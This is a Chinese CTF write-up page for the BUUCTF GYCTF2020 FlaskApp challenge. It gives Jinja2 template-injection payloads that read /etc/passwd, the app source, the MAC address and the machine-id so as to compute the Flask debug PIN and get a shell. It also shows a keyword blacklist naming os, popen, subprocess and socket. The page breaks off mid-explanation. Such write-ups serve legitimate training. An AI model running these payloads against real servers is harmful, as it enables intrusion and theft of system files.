@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="漏洞点 开启了debug模式 模板注入背景知识什么是flask的debug模式\pin码？Flask开启debug模式等于给黑客留了后门利用方法1总体思路是  利ssti获取生成PIN码的数据，然后利用PIN码拿到shell 首先要找到ssti漏洞点，输入一些脏字符，看到有源码泄露 12345678910@app.route(&amp;#x27;&#x2F;decode&amp;#x27;,methods&#x3D;[&amp;#x27;P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti">
+<meta property="og:url" content="http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="漏洞点 开启了debug模式 模板注入背景知识什么是flask的debug模式\pin码？Flask开启debug模式等于给黑客留了后门利用方法1总体思路是  利ssti获取生成PIN码的数据，然后利用PIN码拿到shell 首先要找到ssti漏洞点，输入一些脏字符，看到有源码泄露 12345678910@app.route(&amp;#x27;&#x2F;decode&amp;#x27;,methods&#x3D;[&amp;#x27;P">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/2022-04-25-22-43-48.png">
+<meta property="article:published_time" content="2022-04-25T14:33:31.000Z">
+<meta property="article:modified_time" content="2022-04-25T15:58:42.995Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/2022-04-25-22-43-48.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&text=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&is_video=false&description=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti&body=Check out this article: http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&title=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&name=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/&t=BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFflask%E7%9A%84debug%E6%A8%A1%E5%BC%8F-pin%E7%A0%81%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是flask的debug模式\pin码？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">3.1.</span> <span class="toc-text">方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">3.2.</span> <span class="toc-text">方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-25T14:33:31.000Z" itemprop="datePublished">2022-04-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
+<li>开启了debug模式</li>
+<li>模板注入<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="什么是flask的debug模式-pin码？"><a href="#什么是flask的debug模式-pin码？" class="headerlink" title="什么是flask的debug模式\pin码？"></a>什么是flask的debug模式\pin码？</h3><img src="/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/2022-04-25-22-43-48.png"><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3>总体思路是</li>
+</ol>
+<p>利ssti获取生成PIN码的数据，然后利用PIN码拿到shell</p>
+<p>首先要找到ssti漏洞点，输入一些脏字符，看到有源码泄露</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :<span class="comment">#可以看到绕过waf即可</span></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        res =  render_template_string(tmp)<span class="comment">#执行模板解析，存在模板注入</span></span><br></pre></td></tr></table></figure>
+<p>先试了49被waf住了14可以，注意要先base64加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#试着读取敏感信息</span></span><br></pre></td></tr></table></figure>
+<p>成功返回如下（不想截图的原因是占内存，个人有点内存洁癖）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果 ： root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin <span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/<span class="built_in">bin</span>:/<span class="built_in">bin</span>/sync games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin man:x:<span class="number">6</span>:<span class="number">12</span>:man:/var/cache/man:/usr/sbin/nologin lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/var/mail:/usr/sbin/nologin news:x:<span class="number">9</span>:<span class="number">9</span>:news:/var/spool/news:/usr/sbin/nologin uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="built_in">bin</span>:/usr/sbin/nologin www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/var/www:/usr/sbin/nologin backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/var/backups:/usr/sbin/nologin <span class="built_in">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="type">List</span> Manager:/var/<span class="built_in">list</span>:/usr/sbin/nologin irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin _apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/usr/sbin/nologin flaskweb:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/flaskweb:/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure>
+<p>接下来读取源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功返回，可以看到waf过滤了很多关键字</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):<span class="comment">#过滤的东西很多</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&amp;lt;name&amp;gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>那么计算PIN码需要什么条件呢？</p>
+<ol>
+<li>flask所登录的用户名。可以通过读取&#x2F;etc&#x2F;password知道 用户为flaskweb<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line">flaskweb:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/flaskweb:/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure></li>
+<li>modname 一般不变就是flask.app</li>
+<li>getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变</li>
+<li>flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</li>
+<li>当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">得到</span><br><span class="line"> 6a:1b:8c:f1:f4:<span class="number">67</span></span><br><span class="line"> 转为十进制</span><br><span class="line"> <span class="number">116666561328231</span></span><br></pre></td></tr></table></figure></li>
+<li>docker机器id<br>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span class="comment">#这个得到的不能用</span></span><br><span class="line"> 或</span><br><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span class="comment">#这个可以</span></span><br><span class="line"> 得到</span><br><span class="line">1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>
